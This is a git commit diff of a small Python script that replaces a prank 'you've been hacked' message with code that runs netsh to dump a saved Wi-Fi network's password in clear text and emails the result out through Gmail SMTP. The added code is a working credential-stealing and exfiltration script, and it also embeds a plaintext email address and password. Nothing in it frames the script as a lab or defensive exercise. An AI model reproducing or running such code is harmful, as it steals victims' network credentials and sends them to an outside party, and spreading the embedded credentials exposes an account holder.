0e3ac263d48d89150adf417fcbe3ebb8a9f8be55
Sergey Nazemtsev <42sdn@mail.ru>
2021-08-02 20:59:17 +0700

    update

--- execute_command.py
+++ execute_command.py
@@ -1,4 +1,14 @@
-import subprocess
-command = "msg * You've been hacked!"
+import subprocess, smtplib
 
-subprocess.Popen(command, shell=True)
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+
+command = "netsh wlan show profile dn_city key=clear"
+result = subprocess.check_output(command, shell=True)
+send_mail("sereganazemcev@gmail.com", "22833720041917master", result)
